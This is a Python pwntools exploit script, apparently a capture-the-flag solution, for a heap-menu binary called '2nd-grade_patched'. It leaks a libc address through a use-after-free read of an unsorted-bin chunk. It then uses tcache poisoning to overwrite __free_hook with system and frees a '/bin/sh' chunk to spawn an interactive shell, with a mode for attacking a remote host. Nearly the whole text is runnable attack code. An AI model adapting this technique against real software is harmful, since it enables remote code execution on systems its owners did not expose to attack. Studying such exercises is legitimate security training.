from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
'''.format(**locals())

exe = './2nd-grade_patched'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info'
context(terminal=['tmux', 'split-window', '-h'])
libc = ELF("./libc.so.6", checksec=False)

def menu():
    io.recvline_contains(b"Choose an option:")

def allocate(idx):
    menu()
    io.sendline(b"1")
    io.sendline(str(idx).encode())

def edit(idx, content):
    menu()
    io.sendline(b"2")
    io.sendline(str(idx).encode())
    io.sendline(content)

def free(idx):
    menu()
    io.sendline(b"3")
    io.sendline(str(idx).encode())

def view(idx):
    menu()
    io.sendline(b'4')
    io.sendline(str(idx).encode())

def exit():
    menu()
    io.sendline(b'5')

io = start()

# allocate 7 chunks to fill tcache
for i in range(7):
    allocate(i)

allocate(7) # this go to unsorted bin
allocate(8) # to prevent merging with topchunk

# free 7 chunks 
for i in range(7):
    free(i)

free(7) # free the unsorted bin
view(7) # leak libc address

io.recvline()
libc_leak = unpack(io.recvline()[:-1].ljust(8, b'\x00'))
libc.address = libc_leak - 0x3aeca0

log.success("Libc leak: %#x", libc_leak)
log.success("Libc base: %#x", libc.address)
log.success("Free hook: %#x", libc.sym['__free_hook'])


# tcache poisoning to overwrite free hook

# alloc 2 chunks
allocate(1)
allocate(2)

# free both chunks
free(1)
free(2)

# overwrite next pointer to free hook address
edit(2, p64(libc.sym['__free_hook']))

allocate(1)
allocate(2)

edit(2, p64(libc.sym.system)) # overwrite __free_hook with system

edit(1, b'/bin/sh\x00') 
free(1) # trigger system

io.interactive()
